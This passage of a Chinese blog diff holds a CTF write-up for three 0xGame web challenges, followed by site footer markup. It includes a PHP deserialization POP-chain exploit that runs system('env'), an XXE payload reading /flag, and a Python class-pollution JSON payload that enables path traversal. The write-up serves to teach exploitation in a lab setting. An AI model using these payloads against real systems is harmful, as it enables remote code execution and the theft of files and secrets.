class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GI</span></span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$furina</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$Charlotte</span> = <span class="variable language_">$this</span> -&gt; furina;   </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Charlotte</span>();  </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mi</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$game</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="variable">$game1</span> = @<span class="variable language_">$this</span> -&gt; game -&gt; <span class="title function_ invoke__">tks</span>();  </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$game1</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0xGame&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$web</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0xGame&#x27;</span>]); </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Rubbish_Unser&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>这题是一道php反序列化的题目，需要找出构造出POP链来执行最终指令，所以现在要找到一头一尾</p>
-<p>class HSR<br>{<br>    public $robin;<br>    function __get($robin)<br>    {<br>        $castorice &#x3D; $this -&gt; robin;<br>        eval($castorice);<br>    }</p>
-<p>注意到这里又eval执行函数，所以这里就是我们最后要执行指令的地方。而在ZZZ类中</p>
-<p>function __destruct()<br>    {<br>        echo “破绽，在这里！” . $this -&gt; yuzuha;<br>    }</p>
-<p>__destruct这是PHP中的一个魔术方法，当有一个对象被销毁时，PHP会自动调用该方法。</p>
-<p>一般在建立 POP链的时候都是反顺序寻找的，在最终选用的类中有一个______get()魔术方法，它需要通过访问不存在的属性从而实现调用，全局只有Elysia是未被定义的属性，而在该类下的魔术方法是___invoke(),当一个对象被当作函数调用时会触发，明显这里的furina被当作函数执行了。</p>
-<p>__call()是当访问不存在的函数时，会自动调用的一个魔术方法，而在类Mi中有一个没有被定义的tks()函数</p>
-<p>而在该类里有一个__toString()函数，当有对象被当作字符串使用时会自动调用这个函数，在类ZZZ中有一个echo “破绽，在这里！” . $this -&gt; yuzuha; (PHP中”.”有着连接字符&#x2F;字符串的作用)所以这里yuzuha被当作字符串处理了,而这里也是我们所建立的POP链的起点所以整条链也就清晰了</p>
-<p>__destruct()—–&gt;</p>
-<p>​                      __toString()—–&gt;</p>
-<p>​                      __call()—–&gt;</p>
-<p>​                      __invoke()—–&gt;</p>
-<p>​                      __get()—–&gt;</p>
-<p>​                      eval</p>
-<p>然后大体的链已经可以之间创建了有一个需要进行判断</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span> -&gt; kiana !== <span class="variable language_">$this</span> -&gt; RaidenMei &amp;&amp; </span><br><span class="line">   <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; kiana) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; RaidenMei) &amp;&amp;</span><br><span class="line">   <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span> -&gt; kiana) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span> -&gt; RaidenMei)) </span><br></pre></td></tr></table></figure>
-
-<p>kiana和RaidenMei不相等，但他们的md5和sha1值相等，这里依旧使用1和“1”进行验证就行了</p>
-<p>因此给出exp</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZZZ</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yuzuha</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HSR</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$robin</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HI3rd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$RaidenMei</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kiana</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$guanxing</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GI</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$furina</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mi</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$game</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">HSR</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;robin = <span class="string">&quot;system(&#x27;env&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">HI3rd</span>();</span><br><span class="line"><span class="variable">$b</span> -&gt; guanxing = <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">GI</span>();</span><br><span class="line"><span class="variable">$c</span> -&gt; furina = <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Mi</span>();</span><br><span class="line"><span class="variable">$d</span> -&gt; game = <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZZZ</span>();</span><br><span class="line"><span class="variable">$e</span> -&gt; yuzuha = <span class="variable">$d</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>并将url编码后的payload用GET方式传输</p>
-<img src="pop1.png" style="zoom:60%;" />
-
-<img src="pop2.png" style="zoom:60%;" />
-
-<h1 id="5-留言板（粉）"><a href="#5-留言板（粉）" class="headerlink" title="5.留言板（粉）"></a>5.留言板（粉）</h1><p>首先是登录界面，简单用burp suite爆破后得到账号密码</p>
-<p>账号：admin  密码：admin123</p>
-<img src="x1.png" style="zoom:60%;" />
-
-<img src="x2.png" style="zoom:60%;" />
-
-<p>由标题知这里存在XXE漏洞</p>
-<p>直接构造payload</p>
-<?xml version="1.0"  ?>
-
-<!DOCTYPE a[
-<!ENTITY xxe SYSTEM "file:///flag">
-
-<p>]&gt;</p>
-<p><msg>&xxe;</msg></p>
-<p>“<!DOCTYPE a[]>”作用是创造一个XML类型，a是[]根元素名称</p>
-<p>”<strong><code>&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</code></strong>“是在定义一个名为xxe的外部实例</p>
-<p>并用file:&#x2F;&#x2F;&#x2F;flag来获取读取&#x2F;flag文件</p>
-<p>“<strong><code>&lt;msg&gt;&amp;xxe;&lt;/msg&gt;</code></strong>”</p>
-<p>创建msg元素，尝试将&#x2F;flag文件内容放入到&amp;xxe中</p>
-<p>send过去得到flag</p>
-<img src="x3.png" style="zoom:60%;" />
-
-
-
-<h1 id="6-Lemon-RevEnge"><a href="#6-Lemon-RevEnge" class="headerlink" title="6.Lemon_RevEnge"></a>6.Lemon_RevEnge</h1><p>首先看一下题目给的附件（是个python文件）</p>
-<p>源代码如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line"></span><br><span class="line">​        merge(v, dst.get(k))</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">​        dst[k] = v</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line"></span><br><span class="line">​      merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">​      <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dst</span>():</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Game0x = Dst()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> request.data:</span><br><span class="line"></span><br><span class="line">​    merge(json.loads(request.data), Game0x)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, Game0x=Game0x)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> <span class="string">&quot;Not Found&quot;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> render_template(path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">  app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">9000</span>)</span><br></pre></td></tr></table></figure>
-
-<p>首先看到了这一部分</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> <span class="string">&quot;Not Found&quot;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> render_template(path)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>说明这题的路径是去访问一个路径再加上页面中的内容提示：</p>
-<img src="polluted1.png" style="zoom:60%;" />
-
-<p>但是得到了Not Found的访问，既然页面提示说了flag在&#x2F;flag中（勉强再相信一次），看看有没有可能&#x2F;flag在某个父目录（上层目录）里面，尝试访问&#x2F;..&#x2F;flag or &#x2F;..&#x2F;..&#x2F;flag等等，都是回复的Not Found 😫。</p>
-<p>在经过寻找后，发现不管我跳出了多少目录，最后访问的依旧还是&#x2F;flag😨.那么现在再看页面就没的多少信息了，回头再看下源代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dst</span>():</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Game0x = Dst()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> request.data:</span><br><span class="line"></span><br><span class="line">​    merge(json.loads(request.data), Game0x)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, Game0x=Game0x</span><br></pre></td></tr></table></figure>
-
-<p>这里创造了一个Game0x实例，并且有着_init__方法，</p>
-<p>@app.route(‘&#x2F;‘,methods&#x3D;[‘POST’, ‘GET’])这里是Flask Web框架中的路由装饰器，这里支持GET,POST方法获取消息体中的内容进行函数装饰，merge(json.loads(request.data), Game0x)，看到这个就知道题目要求上传一个JSON内容并且这里调用了merge(    )函数，回到上面的部分</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line"></span><br><span class="line">​        merge(v, dst.get(k))</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">​        dst[k] = v</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line"></span><br><span class="line">​      merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">​      <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure>
-
-<p>然后进行然后分别对scr（用户上传的JSON内容经过转换后变成了Python字典），以及dst（Game0x实例）进行键值对的检查,到最后我们要达到这一目的   setattr(dst, k, v)    ，再想到改题目会把&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;给变成&#x2F;（网上查看了一下，可能是os.path.exists()函数执行时同时执行了normpath方法，而这个方法会规范化path路径，才导致了这个结果），再看到官方payload是这个</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;os&quot;:&#123;&quot;path&quot;:&#123;&quot;pardir&quot;:&quot;,&quot;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里到最后会形成访问链：</p>
-<p>Game0x.<strong>init</strong>.<strong>globals</strong>[“os”].path 然后再将path中的pardir属性改成“，”这样最后系统就会将要规范化的字符换了目标本来是要规范&#x2F;..&#x2F;，现在要规范&#x2F;,&#x2F;   这就可以保证我们可以正常浏览&#x2F;..&#x2F;类的网页了。后面使用burp suite进行POST,GET请求。（因为我在尝试使用Hackbar传输的时候，总是出现一些错误👀）</p>
-<p>(先POSTJSON内容，再GET所需路径)</p>
-<img src="polluted2.png" style="zoom:60%;" />
-
-<img src="polluted3.png" style="zoom:60%;" />
-
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/0xGame-Web-week1/" style="color: #ffa2c4">-0xGame Web -week1</a>
-        </span>
-        
-    </div>
-    <a href="/2025/11/14/0xGame-week1-web-wp/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2025/11/13/Hello-World/">
-        <h2 class="post-title">Hello World</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2025/11/13
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>Hello World!</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/Hexo/" style="color: #03a9f4">-Hexo</a>
-        </span>
-        
-    </div>
-    <a href="/2025/11/13/Hello-World/" class="go-post">阅读全文</a>
-</div>
-
-
-        <div class="page-current">
-    
-    <span class="current">1</span>
-    
-    
-    
-    
-</div>
-
-    </div>
-    
-    <div id="home-card">
-        <div id="card-style">
-    <div id="card-div">
-        <div class="avatar">
-            <img src="/images/baizi.jpg" alt="avatar" />
-        </div>
-        <div class="name">John Doe</div>
-        <div class="description">
-            <p>Description<br>…</p>
-
-        </div>
-        
-        
-        <div class="friend-links">
-            
-            <div class="friend-link">
-                <a target="_blank" rel="noopener" href="https://argvchs.github.io">Argvchs</a>
-            </div>
-            
-        </div>
-        
-    </div>
-</div>
-
-    </div>
-    
-</div>
-
-            <footer id="footer">
-    <div id="footer-wrap">
-        <div>
-            &copy;
-            2022 - 2025 Blank
-            <span id="footer-icon">
-                <i class="fa-solid fa-font-awesome fa-fw"></i>
-            </span>
-            &commat;John Doe
-        </div>
-        <div>
-            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
-            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
-        </div>
-        
-    </div>
-</footer>
-
-        </div>
-        
-        <transition name="fade">
-            <div id="preview" ref="preview" v-show="previewShow">
-                <img id="preview-content" ref="previewContent" />
-            </div>
-        </transition>
-        
-    </div>
-    <script src="/js/main.js"></script>
-    
-</body>
-</html>
+            <span class="card-archive-list-count">3</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">4</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-01-25T06:10:03.236Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By John Doe</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4-b1"></script><script src="/js/main.js?v=5.5.4-b1"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
